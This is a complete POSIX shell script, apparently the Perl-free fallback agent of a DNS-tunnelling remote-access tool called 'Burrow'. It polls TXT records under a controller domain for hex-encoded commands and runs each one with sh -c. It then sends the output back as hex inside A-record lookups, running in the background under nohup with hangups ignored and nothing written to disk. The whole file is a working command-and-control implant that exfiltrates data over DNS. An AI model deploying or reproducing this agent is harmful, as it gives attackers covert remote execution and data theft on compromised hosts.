#!/bin/sh
# Burrow fallback agent for hosts without Perl: shell tasks only (no
# tunnel, no pty, no put, commands up to one DNS answer).
# Needs only: sh (ksh88 is fine), nslookup, awk, od, sed, tr, grep.
# No bash-isms, no substring expansion, no long lines (AIX sed/cut
# limit is 2048 chars), nothing written to disk.
#
#   nohup sh burrowclient.sh tunnel.example.com >/dev/null 2>&1 &
#
#   sh burrowclient.sh <domain> [poll_seconds] [resolver_ip] [resolver_port]
#
# Tasks are polled under <cid>.h.<domain> and arrive hex-encoded (ksh
# has no base64); output goes back as hex in A lookups like the Perl agent.
# No per-command timeout: a command that hangs blocks the beacon.

domain=$1
interval=${2:-2}
resolver=$3
port=$4

[ -z "$domain" ] && { echo "usage: $0 <domain> [poll_seconds] [resolver_ip] [resolver_port]" >&2; exit 1; }

trap '' HUP

max_hex=60000          # 30000 bytes of output per command
label_len=60
cid=$(od -An -N3 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')
[ -z "$cid" ] && cid=$(printf '%06x' $$)
poll=0

# Room per lookup depends on the suffix; size it for a 5-digit task id.
suffix=".99999.$cid.o.$domain"
room=$((253 - ${#suffix} - 7))
labels=$((room / (label_len + 1)))
[ $labels -lt 1 ] && labels=1
[ $labels -gt 3 ] && labels=3
per=$((labels * label_len))

lookup() {
    # $1 type, $2 name
    if [ -n "$port" ]; then
        nslookup -querytype=$1 -timeout=5 -retry=2 -port=$port "$2." $resolver 2>&1
    else
        nslookup -querytype=$1 -timeout=5 -retry=2 "$2." $resolver 2>&1
    fi
}

hexdec() {
    awk 'BEGIN { h = "0123456789abcdef" }
         { n = length($0)
           for (i = 1; i <= n; i += 2) {
               v = (index(h, substr($0, i, 1)) - 1) * 16 + (index(h, substr($0, i + 1, 1)) - 1)
               printf "%c", v
           } }'
}

# stdin: raw bytes. stdout: one line per lookup, labels already dotted.
hexlines() {
    od -An -v -tx1 | awk -v per="$per" -v lab="$label_len" -v max="$max_hex" '
        function emit(s,   i, o) {
            o = ""
            for (i = 1; i <= length(s); i += lab)
                o = o (i > 1 ? "." : "") substr(s, i, lab)
            print o
        }
        {
            gsub(/ /, "")
            if (total >= max) next
            if (total + length($0) > max) $0 = substr($0, 1, max - total)
            total += length($0)
            buf = buf $0
            while (length(buf) >= per) {
                emit(substr(buf, 1, per))
                buf = substr(buf, per + 1)
            }
        }
        END { if (length(buf) > 0) emit(buf) }'
}

send_a() {
    try=0
    while [ $try -lt 3 ]; do
        if lookup A "$1" | grep '^Name:' >/dev/null 2>&1; then
            return 0
        fi
        try=$((try + 1))
        sleep 1
    done
    return 1
}

run_task() {
    # $1 tid, $2 command
    out=$(sh -c "$2" 2>&1)
    [ -z "$out" ] && out="[no output]"
    lines=$(printf '%s\n' "$out" | hexlines)
    count=$(printf '%s\n' "$lines" | grep -c .)
    seq=0
    printf '%s\n' "$lines" | while read -r line; do
        [ -z "$line" ] && continue
        send_a "s$seq.$line.$1.$cid.o.$domain"
        seq=$((seq + 1))
    done
    send_a "e$count.$1.$cid.o.$domain"
}

while :; do
    poll=$((poll + 1))
    name="$poll$(od -An -N2 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n').$cid.h.$domain"
    task=$(lookup TXT "$name" | sed -n 's/.*text = "\(.*\)".*$/\1/p' | sed 's/" "//g' | head -1)
    case "$task" in
        0|"")
            sleep "$interval"
            ;;
        *)
            tid=${task%%:*}
            hexcmd=${task#*:}
            cmd=$(printf '%s' "$hexcmd" | hexdec)
            case "$cmd" in
                exit) exit 0 ;;
            esac
            run_task "$tid" "$cmd"
            ;;
    esac
done
